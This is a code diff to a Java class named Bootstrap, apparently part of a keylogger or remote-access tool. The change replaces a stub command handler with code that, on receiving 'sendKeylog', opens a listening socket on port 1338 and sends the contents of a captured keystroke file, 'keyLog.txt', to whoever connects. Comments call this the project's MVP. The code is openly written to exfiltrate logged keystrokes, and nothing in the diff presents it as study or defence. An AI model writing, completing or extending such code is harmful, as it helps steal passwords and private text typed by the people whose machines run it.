@@ -110,13 +110,25 @@ public class Bootstrap {
     Listen invokes this method when it receives a message over the socket
     preforms actions based on arguments
      */
-    private static void parseCommand(String recievedCommand){
+    private static void parseCommand(String recievedCommand) throws IOException{
         //TODO: implemnt this method
         //split command into an array of words.
         //parse command based on array.
 
-        //for now lets just print the command
-        System.out.println(recievedCommand);
+        //TODO update to handle large files
+        //for now lets just handle our MVP, sending the keylog file over the network
+        if (recievedCommand.equals("sendKeylog")){
+            ServerSocket serverSocket = new ServerSocket(1338);
+            Socket socket = serverSocket.accept();
+            FileInputStream fileIn = new FileInputStream("keyLog.txt");
+
+            byte[] data = new byte[1024];
+            fileIn.read(data, 0, data.length);
+
+            OutputStream outputStream = socket.getOutputStream();
+            outputStream.write(data, 0, data.length);
+            socket.close();
+        }
 
 
     }
